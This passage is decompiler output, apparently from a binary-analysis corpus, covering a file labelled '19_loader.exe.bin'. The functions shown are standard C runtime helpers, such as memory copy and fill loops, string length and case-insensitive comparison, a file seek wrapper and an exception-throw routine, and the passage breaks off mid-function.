        uVar6 = (ulonglong)(pbVar5[2] != 0) + 3;
      }
      local_res8[0] = 0;
      lVar1 = FUN_1400208b8((ulonglong)local_res8,pbVar5,uVar6,param_4,param_5);
      if (lVar1 == -1) {
        *param_2 = pbVar5;
        *(undefined1 *)(param_5 + 0x30) = 1;
        *(undefined4 *)(param_5 + 0x2c) = 0x2a;
        return -1;
      }
      if (lVar1 == 0) {
        pbVar5 = (byte *)0x0;
        *puVar4 = 0;
        break;
      }
      if (0xffff < local_res8[0]) {
        if (param_3 < 2) break;
        param_3 = param_3 - 1;
        *puVar4 = (ushort)(local_res8[0] - 0x10000 >> 10) | 0xd800;
        puVar4 = puVar4 + 1;
        local_res8[0] = (uint)((ushort)(local_res8[0] - 0x10000) & 0x3ff | 0xdc00);
      }
      *puVar4 = (ushort)local_res8[0];
      pbVar5 = pbVar5 + lVar1;
      puVar4 = puVar4 + 1;
    }
    *param_2 = pbVar5;
    lVar1 = (longlong)puVar4 - (longlong)param_1 >> 1;
  }
  return lVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20c80 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020c80 rva=0x20c80 */

undefined8 FUN_140020c80(int *param_1,ulonglong param_2,ULONG_PTR param_3,ulonglong *param_4)

{
  ulonglong uVar1;
  undefined8 uVar2;
  
  uVar1 = param_4[7];
  FUN_14001a0c0(param_2,(longlong)param_4,(int *)(uVar1 + 4));
  if ((*(uint *)(uVar1 + 4) & ((*(byte *)(param_1 + 1) & 0x66) != 0) + 1) == 0) {
    return 1;
  }
  uVar2 = FUN_1400195e0(param_1,param_2,param_3,param_4);
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20d00 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020d00 rva=0x20d00 */

void FUN_140020d00(undefined1 *param_1,undefined1 *param_2,longlong param_3)

{
  for (; param_3 != 0; param_3 = param_3 + -1) {
    *param_1 = *param_2;
    param_2 = param_2 + 1;
    param_1 = param_1 + 1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20d20 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020d20 rva=0x20d20 */

void FUN_140020d20(longlong param_1,undefined8 *param_2,longlong param_3)

{
  undefined4 *puVar1;
  undefined8 *puVar2;
  undefined8 *puVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined8 uVar7;
  undefined8 uVar8;
  undefined8 uVar9;
  undefined8 uVar10;
  undefined8 uVar11;
  undefined8 *in_RAX;
  longlong lVar12;
  undefined4 *puVar13;
  undefined4 *puVar14;
  undefined4 *puVar15;
  longlong lVar16;
  ulonglong uVar17;
  ulonglong uVar18;
  undefined4 uVar19;
  undefined4 uVar20;
  undefined4 uVar21;
  undefined4 uVar22;
  
  uVar7 = *param_2;
  uVar8 = param_2[1];
  lVar16 = (longlong)param_2 - param_1;
  lVar12 = param_1 + param_3;
  puVar15 = (undefined4 *)(lVar12 + -0x10 + lVar16);
  uVar4 = puVar15[1];
  uVar5 = puVar15[2];
  uVar6 = puVar15[3];
  puVar13 = (undefined4 *)(lVar12 + -0x10);
  uVar17 = param_3 - 0x10;
  puVar14 = puVar13;
  uVar19 = *puVar15;
  uVar20 = uVar4;
  uVar21 = uVar5;
  uVar22 = uVar6;
  if (((ulonglong)puVar13 & 0xf) != 0) {
    puVar14 = (undefined4 *)((ulonglong)puVar13 & 0xfffffffffffffff0);
    puVar1 = (undefined4 *)((longlong)puVar14 + lVar16);
    uVar19 = *puVar1;
    uVar20 = puVar1[1];
    uVar21 = puVar1[2];
    uVar22 = puVar1[3];
    *puVar13 = *puVar15;
    *(undefined4 *)(lVar12 + -0xc) = uVar4;
    *(undefined4 *)(lVar12 + -8) = uVar5;
    *(undefined4 *)(lVar12 + -4) = uVar6;
    uVar17 = (longlong)puVar14 - (longlong)in_RAX;
  }
  uVar18 = uVar17 >> 7;
  if (uVar18 != 0) {
    *puVar14 = uVar19;
    puVar14[1] = uVar20;
    puVar14[2] = uVar21;
    puVar14[3] = uVar22;
    puVar15 = puVar14;
    while( true ) {
      puVar2 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x10);
      uVar9 = puVar2[1];
      puVar3 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x20);
      uVar10 = *puVar3;
      uVar11 = puVar3[1];
      puVar14 = puVar15 + -0x20;
      *(undefined8 *)(puVar15 + -4) = *puVar2;
      *(undefined8 *)(puVar15 + -2) = uVar9;
      *(undefined8 *)(puVar15 + -8) = uVar10;
      *(undefined8 *)(puVar15 + -6) = uVar11;
      puVar2 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x30);
      uVar9 = puVar2[1];
      puVar3 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x40);
      uVar10 = *puVar3;
      uVar11 = puVar3[1];
      uVar18 = uVar18 - 1;
      *(undefined8 *)(puVar15 + -0xc) = *puVar2;
      *(undefined8 *)(puVar15 + -10) = uVar9;
      *(undefined8 *)(puVar15 + -0x10) = uVar10;
      *(undefined8 *)(puVar15 + -0xe) = uVar11;
      puVar2 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x50);
      uVar9 = puVar2[1];
      puVar3 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x60);
      uVar10 = *puVar3;
      uVar11 = puVar3[1];
      *(undefined8 *)(puVar15 + -0x14) = *puVar2;
      *(undefined8 *)(puVar15 + -0x12) = uVar9;
      *(undefined8 *)(puVar15 + -0x18) = uVar10;
      *(undefined8 *)(puVar15 + -0x16) = uVar11;
      puVar2 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x70);
      uVar9 = *puVar2;
      uVar10 = puVar2[1];
      puVar13 = (undefined4 *)((longlong)puVar14 + lVar16);
      uVar19 = *puVar13;
      uVar20 = puVar13[1];
      uVar21 = puVar13[2];
      uVar22 = puVar13[3];
      if (uVar18 == 0) break;
      *(undefined8 *)(puVar15 + -0x1c) = uVar9;
      *(undefined8 *)(puVar15 + -0x1a) = uVar10;
      *puVar14 = uVar19;
      puVar15[-0x1f] = uVar20;
      puVar15[-0x1e] = uVar21;
      puVar15[-0x1d] = uVar22;
      puVar15 = puVar14;
    }
    *(undefined8 *)(puVar15 + -0x1c) = uVar9;
    *(undefined8 *)(puVar15 + -0x1a) = uVar10;
    uVar17 = uVar17 & 0x7f;
  }
  for (uVar18 = uVar17 >> 4; uVar18 != 0; uVar18 = uVar18 - 1) {
    *puVar14 = uVar19;
    puVar14[1] = uVar20;
    puVar14[2] = uVar21;
    puVar14[3] = uVar22;
    puVar14 = puVar14 + -4;
    puVar15 = (undefined4 *)((longlong)puVar14 + lVar16);
    uVar19 = *puVar15;
    uVar20 = puVar15[1];
    uVar21 = puVar15[2];
    uVar22 = puVar15[3];
  }
  if ((uVar17 & 0xf) != 0) {
    *in_RAX = uVar7;
    in_RAX[1] = uVar8;
  }
  *puVar14 = uVar19;
  puVar14[1] = uVar20;
  puVar14[2] = uVar21;
  puVar14[3] = uVar22;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20e10 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020e10 rva=0x20e10 */

void FUN_140020e10(undefined1 *param_1,undefined1 *param_2,longlong param_3)

{
  for (; param_3 != 0; param_3 = param_3 + -1) {
    *param_1 = *param_2;
    param_2 = param_2 + 1;
    param_1 = param_1 + 1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20e30 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020e30 rva=0x20e30 */

void FUN_140020e30(longlong param_1,undefined8 *param_2,longlong param_3)

{
  undefined4 *puVar1;
  undefined8 *puVar2;
  undefined8 *puVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined8 uVar7;
  undefined8 uVar8;
  undefined8 uVar9;
  undefined8 uVar10;
  undefined8 uVar11;
  undefined8 *in_RAX;
  longlong lVar12;
  undefined4 *puVar13;
  undefined4 *puVar14;
  undefined4 *puVar15;
  longlong lVar16;
  ulonglong uVar17;
  ulonglong uVar18;
  undefined4 uVar19;
  undefined4 uVar20;
  undefined4 uVar21;
  undefined4 uVar22;
  
  uVar7 = *param_2;
  uVar8 = param_2[1];
  lVar16 = (longlong)param_2 - param_1;
  lVar12 = param_1 + param_3;
  puVar15 = (undefined4 *)(lVar12 + -0x10 + lVar16);
  uVar4 = puVar15[1];
  uVar5 = puVar15[2];
  uVar6 = puVar15[3];
  puVar13 = (undefined4 *)(lVar12 + -0x10);
  uVar17 = param_3 - 0x10;
  puVar14 = puVar13;
  uVar19 = *puVar15;
  uVar20 = uVar4;
  uVar21 = uVar5;
  uVar22 = uVar6;
  if (((ulonglong)puVar13 & 0xf) != 0) {
    puVar14 = (undefined4 *)((ulonglong)puVar13 & 0xfffffffffffffff0);
    puVar1 = (undefined4 *)((longlong)puVar14 + lVar16);
    uVar19 = *puVar1;
    uVar20 = puVar1[1];
    uVar21 = puVar1[2];
    uVar22 = puVar1[3];
    *puVar13 = *puVar15;
    *(undefined4 *)(lVar12 + -0xc) = uVar4;
    *(undefined4 *)(lVar12 + -8) = uVar5;
    *(undefined4 *)(lVar12 + -4) = uVar6;
    uVar17 = (longlong)puVar14 - (longlong)in_RAX;
  }
  uVar18 = uVar17 >> 7;
  if (uVar18 != 0) {
    *puVar14 = uVar19;
    puVar14[1] = uVar20;
    puVar14[2] = uVar21;
    puVar14[3] = uVar22;
    puVar15 = puVar14;
    while( true ) {
      puVar2 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x10);
      uVar9 = puVar2[1];
      puVar3 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x20);
      uVar10 = *puVar3;
      uVar11 = puVar3[1];
      puVar14 = puVar15 + -0x20;
      *(undefined8 *)(puVar15 + -4) = *puVar2;
      *(undefined8 *)(puVar15 + -2) = uVar9;
      *(undefined8 *)(puVar15 + -8) = uVar10;
      *(undefined8 *)(puVar15 + -6) = uVar11;
      puVar2 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x30);
      uVar9 = puVar2[1];
      puVar3 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x40);
      uVar10 = *puVar3;
      uVar11 = puVar3[1];
      uVar18 = uVar18 - 1;
      *(undefined8 *)(puVar15 + -0xc) = *puVar2;
      *(undefined8 *)(puVar15 + -10) = uVar9;
      *(undefined8 *)(puVar15 + -0x10) = uVar10;
      *(undefined8 *)(puVar15 + -0xe) = uVar11;
      puVar2 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x50);
      uVar9 = puVar2[1];
      puVar3 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x60);
      uVar10 = *puVar3;
      uVar11 = puVar3[1];
      *(undefined8 *)(puVar15 + -0x14) = *puVar2;
      *(undefined8 *)(puVar15 + -0x12) = uVar9;
      *(undefined8 *)(puVar15 + -0x18) = uVar10;
      *(undefined8 *)(puVar15 + -0x16) = uVar11;
      puVar2 = (undefined8 *)((longlong)puVar15 + lVar16 + -0x70);
      uVar9 = *puVar2;
      uVar10 = puVar2[1];
      puVar13 = (undefined4 *)((longlong)puVar14 + lVar16);
      uVar19 = *puVar13;
      uVar20 = puVar13[1];
      uVar21 = puVar13[2];
      uVar22 = puVar13[3];
      if (uVar18 == 0) break;
      *(undefined8 *)(puVar15 + -0x1c) = uVar9;
      *(undefined8 *)(puVar15 + -0x1a) = uVar10;
      *puVar14 = uVar19;
      puVar15[-0x1f] = uVar20;
      puVar15[-0x1e] = uVar21;
      puVar15[-0x1d] = uVar22;
      puVar15 = puVar14;
    }
    *(undefined8 *)(puVar15 + -0x1c) = uVar9;
    *(undefined8 *)(puVar15 + -0x1a) = uVar10;
    uVar17 = uVar17 & 0x7f;
  }
  for (uVar18 = uVar17 >> 4; uVar18 != 0; uVar18 = uVar18 - 1) {
    *puVar14 = uVar19;
    puVar14[1] = uVar20;
    puVar14[2] = uVar21;
    puVar14[3] = uVar22;
    puVar14 = puVar14 + -4;
    puVar15 = (undefined4 *)((longlong)puVar14 + lVar16);
    uVar19 = *puVar15;
    uVar20 = puVar15[1];
    uVar21 = puVar15[2];
    uVar22 = puVar15[3];
  }
  if ((uVar17 & 0xf) != 0) {
    *in_RAX = uVar7;
    in_RAX[1] = uVar8;
  }
  *puVar14 = uVar19;
  puVar14[1] = uVar20;
  puVar14[2] = uVar21;
  puVar14[3] = uVar22;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20f20 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020f20 rva=0x20f20 */

undefined8 FUN_140020f20(undefined1 *param_1,undefined1 param_2,longlong param_3,undefined8 param_4)

{
  for (; param_3 != 0; param_3 = param_3 + -1) {
    *param_1 = param_2;
    param_1 = param_1 + 1;
  }
  return param_4;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20f30 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020f30 rva=0x20f30 */

void FUN_140020f30(char *param_1,longlong param_2)

{
  char cVar1;
  longlong lVar2;
  
  lVar2 = 0;
  cVar1 = *param_1;
  while ((cVar1 != '\0' && (lVar2 != param_2))) {
    lVar2 = lVar2 + 1;
    cVar1 = param_1[lVar2];
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20f48 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020f48 rva=0x20f48 */

longlong thunk_FUN_140020f50(uint param_1,LARGE_INTEGER param_2,DWORD param_3,longlong param_4)

{
  byte *pbVar1;
  BOOL BVar2;
  DWORD DVar3;
  HANDLE hFile;
  LARGE_INTEGER aLStack_18 [2];
  
  hFile = (HANDLE)FUN_14001b720(param_1);
  if (hFile == (HANDLE)0xffffffffffffffff) {
    *(undefined1 *)(param_4 + 0x30) = 1;
    *(undefined4 *)(param_4 + 0x2c) = 9;
  }
  else {
    aLStack_18[0].QuadPart = 0;
    BVar2 = SetFilePointerEx(hFile,param_2,aLStack_18,param_3);
    if (BVar2 == 0) {
      DVar3 = GetLastError();
      FUN_140018f2c(DVar3,param_4);
    }
    else if (aLStack_18[0].QuadPart != -1) {
      pbVar1 = (byte *)((&DAT_1400e0d40)[(longlong)(int)param_1 >> 6] + 0x38 +
                       (ulonglong)(param_1 & 0x3f) * 0x48);
      *pbVar1 = *pbVar1 & 0xfd;
      return aLStack_18[0].QuadPart;
    }
  }
  return -1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x20f50 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140020f50 rva=0x20f50 */

longlong FUN_140020f50(uint param_1,LARGE_INTEGER param_2,DWORD param_3,longlong param_4)

{
  byte *pbVar1;
  BOOL BVar2;
  DWORD DVar3;
  HANDLE hFile;
  LARGE_INTEGER local_18 [2];
  
  hFile = (HANDLE)FUN_14001b720(param_1);
  if (hFile == (HANDLE)0xffffffffffffffff) {
    *(undefined1 *)(param_4 + 0x30) = 1;
    *(undefined4 *)(param_4 + 0x2c) = 9;
  }
  else {
    local_18[0].QuadPart = 0;
    BVar2 = SetFilePointerEx(hFile,param_2,local_18,param_3);
    if (BVar2 == 0) {
      DVar3 = GetLastError();
      FUN_140018f2c(DVar3,param_4);
    }
    else if (local_18[0].QuadPart != -1) {
      pbVar1 = (byte *)((&DAT_1400e0d40)[(longlong)(int)param_1 >> 6] + 0x38 +
                       (ulonglong)(param_1 & 0x3f) * 0x48);
      *pbVar1 = *pbVar1 & 0xfd;
      return local_18[0].QuadPart;
    }
  }
  return -1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21000 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021000 rva=0x21000 */

undefined2 FUN_140021000(undefined2 param_1)

{
  bool bVar1;
  BOOL BVar2;
  undefined7 extraout_var;
  undefined2 local_res8 [4];
  DWORD local_res10 [6];
  
  local_res8[0] = param_1;
  bVar1 = FUN_140021a7c();
  if ((int)CONCAT71(extraout_var,bVar1) != 0) {
    local_res10[0] = 0;
    BVar2 = FUN_140021ad0(local_res8,1,local_res10);
    if (BVar2 != 0) {
      return local_res8[0];
    }
  }
  return 0xffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21040 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021040 rva=0x21040 */

ulonglong FUN_140021040(int *param_1)

{
  ulonglong uVar1;
  longlong lVar2;
  longlong local_48 [2];
  undefined1 local_38;
  undefined *local_30;
  undefined *puStack_28;
  char local_20;
  undefined4 local_1c;
  char local_18;
  undefined4 local_14;
  char local_10;
  
  local_48[0] = 0;
  local_20 = DAT_1400e07f8 == 0;
  local_38 = 0;
  local_18 = '\0';
  local_10 = '\0';
  if ((bool)local_20) {
    local_30 = PTR_PTR_1400e0358;
    puStack_28 = PTR_DAT_1400e0360;
  }
  uVar1 = FUN_140021180(param_1,local_48);
  if (local_20 == '\x02') {
    *(uint *)(local_48[0] + 0x3a8) = *(uint *)(local_48[0] + 0x3a8) & 0xfffffffd;
  }
  if (local_18 != '\0') {
    lVar2 = FUN_14001835c(local_48);
    *(undefined4 *)(lVar2 + 0x20) = local_1c;
  }
  if (local_10 != '\0') {
    lVar2 = FUN_14001835c(local_48);
    *(undefined4 *)(lVar2 + 0x24) = local_14;
  }
  return uVar1 & 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x210d8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400210d8 rva=0x210d8 */

ulonglong FUN_1400210d8(int *param_1,longlong *param_2)

{
  uint uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  
  if (param_1 == (int *)0x0) {
    *(undefined1 *)(param_2 + 6) = 1;
    *(undefined4 *)((longlong)param_2 + 0x2c) = 0x16;
    FUN_1400182a4(0,0,0,0,0,param_2);
    uVar2 = 0xffffffff;
  }
  else {
    uVar2 = 0xffffffff;
    if (((uint)param_1[5] >> 0xd & 1) != 0) {
      uVar2 = FUN_1400189ec(param_1,param_2);
      uVar2 = uVar2 & 0xffffffff;
      FUN_14001e008((undefined8 *)param_1);
      uVar1 = FUN_14001d2b0((longlong)param_1);
      uVar3 = FUN_140021c7c(uVar1,param_2);
      if ((int)uVar3 < 0) {
        uVar2 = 0xffffffff;
      }
      else if (*(LPVOID *)(param_1 + 10) != (LPVOID)0x0) {
        FUN_140017fb0(*(LPVOID *)(param_1 + 10));
        param_1[10] = 0;
        param_1[0xb] = 0;
      }
    }
    FUN_140021db8((undefined8 *)param_1);
  }
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21180 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021180 rva=0x21180 */

ulonglong FUN_140021180(int *param_1,longlong *param_2)

{
  ulonglong uVar1;
  
  if (param_1 == (int *)0x0) {
    *(undefined1 *)(param_2 + 6) = 1;
    *(undefined4 *)((longlong)param_2 + 0x2c) = 0x16;
    FUN_1400182a4(0,0,0,0,0,param_2);
  }
  else {
    if (((uint)param_1[5] >> 0xc & 1) == 0) {
      FUN_140018c58((longlong)param_1);
      uVar1 = FUN_1400210d8(param_1,param_2);
      FUN_140018c64((longlong)param_1);
      return uVar1 & 0xffffffff;
    }
    FUN_140021db8((undefined8 *)param_1);
  }
  return 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21200 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021200 rva=0x21200 */

void _guard_check_icall(void)

{
  _guard_check_icall();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21250 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021250 rva=0x21250 */

void FUN_140021250(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)FUN_140016080();
  (*pcVar1)();
  FUN_1400160b0();
  FUN_140016080();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21290 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021290 rva=0x21290 */

void FUN_140021290(longlong *param_1,longlong *param_2)

{
  longlong lVar1;
  longlong lVar2;
  char *pcVar3;
  
  if (((char)param_1[1] == '\0') || (*param_1 == 0)) {
    *param_2 = *param_1;
    *(undefined1 *)(param_2 + 1) = 0;
    return;
  }
  lVar1 = -1;
  do {
    lVar2 = lVar1;
    lVar1 = lVar2 + 1;
  } while (*(char *)(*param_1 + 1 + lVar2) != '\0');
  pcVar3 = thunk_FUN_140019a00(lVar2 + 2U);
  if (pcVar3 != (char *)0x0) {
    FUN_140016340(pcVar3,lVar2 + 2U,*param_1);
    *param_2 = (longlong)pcVar3;
    *(undefined1 *)(param_2 + 1) = 1;
  }
  thunk_FUN_140017fb0((LPVOID)0x0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x212ae | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400212ae rva=0x212ae */

void FUN_1400212ae(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  longlong lVar1;
  longlong lVar2;
  char *pcVar3;
  longlong *unaff_RBX;
  undefined8 *unaff_RDI;
  
  lVar1 = -1;
  do {
    lVar2 = lVar1;
    lVar1 = lVar2 + 1;
  } while (*(char *)(param_3 + 1 + lVar2) != '\0');
  pcVar3 = thunk_FUN_140019a00(lVar2 + 2U);
  if (pcVar3 != (char *)0x0) {
    FUN_140016340(pcVar3,lVar2 + 2U,*unaff_RBX);
    *unaff_RDI = pcVar3;
    *(undefined1 *)(unaff_RDI + 1) = 1;
  }
  thunk_FUN_140017fb0((LPVOID)0x0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21310 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021310 rva=0x21310 */

void FUN_140021310(undefined8 *param_1,undefined8 *param_2)

{
  *param_2 = *param_1;
  *(undefined1 *)(param_2 + 1) = 0;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21330 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021330 rva=0x21330 */

void FUN_140021330(undefined8 *param_1)

{
  if (*(char *)(param_1 + 1) == '\0') {
    *(undefined1 *)(param_1 + 1) = 0;
    *param_1 = 0;
    return;
  }
  thunk_FUN_140017fb0((LPVOID)*param_1);
  *(undefined1 *)(param_1 + 1) = 0;
  *param_1 = 0;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21370 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021370 rva=0x21370 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140021370(longlong *param_1,byte *param_2)

{
  ULONG_PTR UVar1;
  PVOID local_38;
  ULONG_PTR local_30;
  longlong *local_28;
  byte *local_20;
  PVOID local_18;
  
  UVar1 = 0x19930520;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 0x10) != 0)) {
    param_2 = *(byte **)(*(longlong *)(*param_1 + -8) + 0x30);
    (**(code **)(*(longlong *)(*param_1 + -8) + 0x40))();
  }
  local_38 = (PVOID)0x0;
  if (param_2 != (byte *)0x0) {
    local_38 = RtlPcToFileHeader(param_2,&local_38);
    if (((*param_2 & 8) != 0) || (local_38 == (PVOID)0x0)) {
      UVar1 = 0x1994000;
    }
  }
  local_30 = UVar1;
  local_28 = param_1;
  local_20 = param_2;
  local_18 = local_38;
  RaiseException(0xe06d7363,1,4,&local_30);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21420 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021420 rva=0x21420 */

ulonglong FUN_140021420(byte *param_1,byte *param_2,ulonglong param_3)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  ulonglong uVar4;
  undefined4 extraout_var;
  uint uVar5;
  uint uVar6;
  
  if (DAT_1400e07f8 != 0) {
    iVar3 = FUN_1400214b0(param_1,param_2,param_3,(undefined8 *)0x0);
    return CONCAT44(extraout_var,iVar3);
  }
  if (((param_1 == (byte *)0x0) || (param_2 == (byte *)0x0)) || (0x7fffffff < param_3)) {
    uVar4 = FUN_140021610((longlong)param_1,(longlong)param_2,param_3);
    return uVar4;
  }
  if (param_3 == 0) {
    return 0;
  }
  while( true ) {
    bVar1 = *param_1;
    uVar5 = (uint)bVar1;
    param_1 = param_1 + 1;
    bVar2 = *param_2;
    uVar6 = (uint)bVar2;
    param_2 = param_2 + 1;
    if ((uint)bVar1 != (uint)bVar2) {
      uVar5 = bVar1 + 0x20;
      if (0x19 < bVar1 - 0x41) {
        uVar5 = (uint)bVar1;
      }
      if (bVar2 - 0x41 < 0x1a) {
        uVar6 = bVar2 + 0x20;
      }
    }
    uVar4 = (ulonglong)(uVar5 - uVar6);
    if ((uVar5 - uVar6 != 0) || (uVar5 == 0)) break;
    param_3 = param_3 - 1;
    if (param_3 == 0) {
      return uVar4;
    }
  }
  return uVar4;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x214b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400214b0 rva=0x214b0 */

int FUN_1400214b0(byte *param_1,byte *param_2,ulonglong param_3,undefined8 *param_4)

{
  byte bVar1;
  int iVar2;
  undefined8 *puVar3;
  longlong local_28;
  undefined *local_20;
  longlong lStack_18;
  char local_10;
  
  if (((param_1 == (byte *)0x0) || (param_2 == (byte *)0x0)) || (0x7fffffff < param_3)) {
    puVar3 = FUN_140018dec();
    *(undefined4 *)puVar3 = 0x16;
    FUN_1400180c4();
    return 0x7fffffff;
  }
  if (param_3 == 0) {
    return 0;
  }
  local_10 = '\0';
  if (param_4 == (undefined8 *)0x0) {
    if (DAT_1400e07f8 == 0) {
      local_20 = PTR_PTR_1400e0358;
      local_10 = '\0';
    }
    else {
      local_28 = FUN_140016bc0();
      local_20 = *(undefined **)(local_28 + 0x90);
      lStack_18 = *(longlong *)(local_28 + 0x88);
      FUN_14001d0a4(local_28,(longlong *)&local_20);
      FUN_14001d0d8(local_28,&lStack_18);
      if ((*(uint *)(local_28 + 0x3a8) & 2) == 0) {
        local_10 = '\x01';
        *(uint *)(local_28 + 0x3a8) = *(uint *)(local_28 + 0x3a8) | 2;
      }
    }
  }
  else {
    local_20 = (undefined *)*param_4;
    local_10 = '\0';
  }
  do {
    bVar1 = *param_1;
    param_1 = param_1 + 1;
    bVar1 = *(byte *)((ulonglong)bVar1 + *(longlong *)(local_20 + 0x110));
    iVar2 = (uint)bVar1 - (uint)*(byte *)((ulonglong)*param_2 + *(longlong *)(local_20 + 0x110));
    if ((iVar2 != 0) || (bVar1 == 0)) break;
    param_3 = param_3 - 1;
    param_2 = param_2 + 1;
  } while (param_3 != 0);
  if (local_10 != '\0') {
    *(uint *)(local_28 + 0x3a8) = *(uint *)(local_28 + 0x3a8) & 0xfffffffd;
  }
  return iVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21610 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021610 rva=0x21610 */

undefined8 FUN_140021610(longlong param_1,longlong param_2,ulonglong param_3)

{
  undefined8 *puVar1;
  
  if (((param_1 == 0) || (param_2 == 0)) || (0x7fffffff < param_3)) {
    puVar1 = FUN_140018dec();
    *(undefined4 *)puVar1 = 0x16;
    FUN_1400180c4();
  }
  return 0x7fffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21644 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021644 rva=0x21644 */

void FUN_140021644(undefined4 *param_1,ushort *param_2,uint param_3,byte *param_4,int param_5,
                  byte *param_6,int param_7,UINT param_8)

{
  longlong local_28;
  longlong local_20 [2];
  char local_10;
  
  FUN_14001743c(&local_28,param_1);
  FUN_1400216d0(local_20,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
  if (local_10 != '\0') {
    *(uint *)(local_28 + 0x3a8) = *(uint *)(local_28 + 0x3a8) & 0xfffffffd;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x216d0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400216d0 rva=0x216d0 */

void FUN_1400216d0(longlong *param_1,ushort *param_2,uint param_3,byte *param_4,int param_5,
                  byte *param_6,int param_7,UINT param_8)

{
  int *piVar1;
  byte bVar2;
  uint uVar3;
  byte *pbVar4;
  ushort *puVar5;
  BOOL BVar6;
  uint uVar7;
  int iVar8;
  int iVar9;
  BYTE *pBVar10;
  longlong lVar11;
  undefined4 *puVar12;
  ulonglong uVar13;
  PCNZWCH pWVar14;
  undefined1 *puVar15;
  undefined1 *puVar16;
  undefined1 *puVar17;
  undefined4 *puVar18;
  undefined1 auStackY_d8 [32];
  uint local_88 [2];
  byte *local_80;
  ushort *local_78;
  _cpinfo local_70;
  ulonglong local_58;
  
  puVar17 = auStackY_d8;
  local_58 = DAT_1400dfc40 ^ (ulonglong)local_88;
  local_80 = param_6;
  local_88[0] = param_3;
  local_78 = param_2;
  if (param_5 < 1) {
    if (param_5 < -1) goto LAB_140021a3b;
  }
  else {
    param_5 = FUN_140020f30((char *)param_4,(longlong)param_5);
  }
  puVar17 = auStackY_d8;
  if (param_7 < 1) {
    if (param_7 < -1) goto LAB_140021a3b;
  }
  else {
    param_7 = FUN_140020f30((char *)param_6,(longlong)param_7);
  }
  if (param_8 == 0) {
    param_8 = *(UINT *)(*param_1 + 0xc);
  }
  if ((param_5 == 0) || (param_7 == 0)) {
    local_70.LeadByte[10] = '\0';
    local_70.LeadByte[0xb] = '\0';
    local_70._18_2_ = 0;
    local_70.MaxCharSize = 0;
    local_70.DefaultChar[0] = '\0';
    local_70.DefaultChar[1] = '\0';
    local_70.LeadByte[0] = '\0';
    local_70.LeadByte[1] = '\0';
    local_70.LeadByte[2] = '\0';
    local_70.LeadByte[3] = '\0';
    local_70.LeadByte[4] = '\0';
    local_70.LeadByte[5] = '\0';
